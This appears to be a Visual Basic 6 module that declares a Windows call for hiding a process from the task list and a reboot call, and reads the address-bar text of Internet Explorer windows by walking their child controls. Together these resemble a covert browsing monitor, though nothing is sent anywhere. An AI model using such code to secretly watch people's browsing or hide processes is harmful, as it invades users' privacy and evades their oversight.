Attribute VB_Name = "mod1"
Private Const EWX_REBOOT As Long = 2
Public Declare Function RegisterServiceProcess Lib _
    "kernel32.dll" (ByVal dwProcessId As Long, _
     ByVal dwType As Long) As Long
     
     Public Declare Function GetCurrentProcessId Lib _
   "kernel32.dll" () As Long

Public Declare Function ExitWindows Lib "user32" (ByVal dwReserved As Long, ByVal uReturnCode As Long) As Long
'''''''''''''''''''''''''''''''''''''''
Option Explicit
Public Type ProcData
    AppHwnd As Long
    title As String
    Placement As String
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Declare Function EnumWindows Lib "user32" (ByVal lpEnumFunc As _
Any, ByVal lParam As Long) As Long

Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" _
(ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindow Lib "user32" (ByVal hwnd As _
Long, ByVal wCmd As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal _
lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal _
hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal _
hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long

Private Const WM_GETTEXT = &HD
Private Const WM_GETTEXTLENGTH = &HE

Private Const GW_CHILD = 5
Private Const GW_HWNDNEXT = 2
Private Const GW_HWNDFIRST = 0
Public Function EditInfo(window_hwnd As Long) As String
Dim txt As String
Dim buf As String
Dim buflen As Long
Dim child_hwnd As Long
Dim children() As Long
Dim num_children As Integer
Dim i As Integer
   
    buflen = 256
    buf = Space$(buflen - 1)
    buflen = GetClassName(window_hwnd, buf, buflen)
    buf = Left$(buf, buflen)
    

    If buf = "Edit" Then
        EditInfo = WindowText(window_hwnd)
        Exit Function
    End If
    
   
    num_children = 0
    child_hwnd = GetWindow(window_hwnd, GW_CHILD)
    Do While child_hwnd <> 0
        num_children = num_children + 1
        ReDim Preserve children(1 To num_children)
        children(num_children) = child_hwnd
        child_hwnd = GetWindow(child_hwnd, GW_HWNDNEXT)
    Loop
    
    
    For i = 1 To num_children
        txt = EditInfo(children(i))
        If txt <> "" Then Exit For
    Next i

    EditInfo = txt
End Function

Public Function WindowText(window_hwnd As Long) As String
Dim txtlen As Long
Dim txt As String

    WindowText = ""
    If window_hwnd = 0 Then Exit Function
    
    txtlen = SendMessage(window_hwnd, WM_GETTEXTLENGTH, 0, 0)
    If txtlen = 0 Then Exit Function
    
    txtlen = txtlen + 1
    txt = Space$(txtlen)
    txtlen = SendMessage(window_hwnd, WM_GETTEXT, txtlen, ByVal txt)
    WindowText = Left$(txt, txtlen)
End Function
Public Function EnumProc(ByVal app_hwnd As Long, ByVal lParam As Long) As Boolean
Dim buf As String * 1024
Dim title As String
Dim length As Long
  
    length = GetWindowText(app_hwnd, buf, Len(buf))
    title = Left$(buf, length)

   
    If Right$(title, 30) = " - Microsoft Internet Explorer" Then
        
'        frminv.Caption = EditInfo(app_hwnd)

       
        EnumProc = 0
    Else
        
        EnumProc = 1
    End If
End Function








